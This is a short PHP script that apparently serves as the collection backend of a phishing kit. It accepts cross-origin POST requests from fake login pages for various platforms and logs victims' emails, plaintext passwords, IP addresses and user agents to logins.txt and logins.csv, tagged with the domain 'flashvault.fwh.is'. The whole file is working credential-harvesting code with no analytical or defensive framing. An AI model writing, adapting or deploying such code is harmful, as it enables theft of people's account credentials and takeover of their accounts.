<?php

// Allow from any origin

header("Access-Control-Allow-Origin: *");

header("Access-Control-Allow-Methods: POST");

header("Access-Control-Allow-Headers: Content-Type");

header('Content-Type: application/json');

// Get the raw POST data

$input = file_get_contents('php://input');

$data = json_decode($input, true);

if (!$data) {

    echo json_encode(['success' => false, 'error' => 'Invalid data']);

    exit;

}

// Extract data

$type = $data['type'] ?? 'unknown';

$email = $data['email'] ?? '';

$password = $data['password'] ?? '';

$ip = $data['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

$userAgent = $data['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$time = $data['time'] ?? date('Y-m-d H:i:s');

// Format the log entry

$logEntry = "========================================\n";

$logEntry .= "TIME: " . $time . "\n";

$logEntry .= "PLATFORM: " . strtoupper($type) . "\n";

$logEntry .= "EMAIL: " . $email . "\n";

$logEntry .= "PASSWORD: " . $password . "\n";

$logEntry .= "IP: " . $ip . "\n";

$logEntry .= "USER AGENT: " . $userAgent . "\n";

$logEntry .= "DOMAIN: flashvault.fwh.is\n";

$logEntry .= "========================================\n\n";

// Save to file

$file = 'logins.txt';

file_put_contents($file, $logEntry, FILE_APPEND | LOCK_EX);

// Also save a simple CSV for easy viewing

$csvLine = '"' . $time . '","' . $type . '","' . $email . '","' . $password . '","' . $ip . '"' . "\n";

file_put_contents('logins.csv', $csvLine, FILE_APPEND | LOCK_EX);

// Return success

echo json_encode(['success' => true]);

?>